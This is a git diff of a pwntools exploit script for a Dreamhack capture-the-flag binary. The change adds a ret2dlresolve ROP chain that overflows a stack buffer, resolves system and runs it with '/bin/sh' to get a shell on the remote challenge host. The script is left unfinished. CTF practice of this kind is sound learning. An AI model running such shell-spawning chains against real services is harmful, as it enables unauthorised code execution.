@@ -10,21 +10,27 @@ context.arch = "amd64"
 context.log_level = "debug"
 context.terminal = ["tmux", "splitw", "-h"]
 
-e = ELF("./prob")
+context.binary = elf = ELF('./prob')
 libc = ELF("./libc.so.6")
 
 def slog(n, a): return success(": ".join([n, hex(a)]))
 
 HOST, PORT = "host8.dreamhack.games 1234".split()
 
-rop = ROP(e)
+rop = ROP(context.binary)
+
+dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh\x00"])
+
+rop.read(dlresolve.data_addr)
+rop.ret2dlresolve(dlresolve)
+raw_rop = rop.chain()
 
 if args.REMOTE:
     p = remote(HOST, PORT)
 elif args.DOCK:
     p = remote("localhost", 80)
 else:
-    p = process("./prob", env={"LD_PRELOAD": "./libc.so.6"})
+    p = elf.process(env={"LD_PRELOAD": "./libc.so.6"})
 
 '''
    0x00000000001147d0 <+0>:     endbr64 
@@ -47,11 +53,11 @@ slog("read@got", e.got["read"])
 
 pay = b'A'*0x20 # buf
 pay += b'b'*0x8
-pay += p64(e.sym["vuln"])
+pay += raw_rop
+
+# 머리 터짐
 
 pause()
-
-pay = 
 
 # pause()
 # gdb.attach(p)
